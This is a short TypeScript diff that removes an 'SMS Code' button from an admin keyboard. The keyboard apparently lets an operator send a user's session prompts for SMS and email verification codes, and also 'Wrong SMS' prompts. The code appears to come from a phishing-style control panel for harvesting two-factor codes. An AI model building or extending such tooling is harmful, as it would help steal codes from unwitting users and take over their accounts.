@@ -632,16 +632,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   }
 
   // Second section: Additional methods
-  // SMS Code button (allow up to 2 attempts)
-  if (!session.authAttempts["sms"] || session.authAttempts["sms"] < 2) {
-    buttons.push([
-      {
-        text: "💬 SMS Code",
-        callback_data: `auth_sms_${sessionId}`,
-      },
-    ]);
-    console.log("✅ Added SMS Code button");
-  }
+  // SMS Code button removed - only Wrong SMS buttons will be available
 
   // Email Code button - show if not attempted
   if (!session.authAttempts["email"]) {
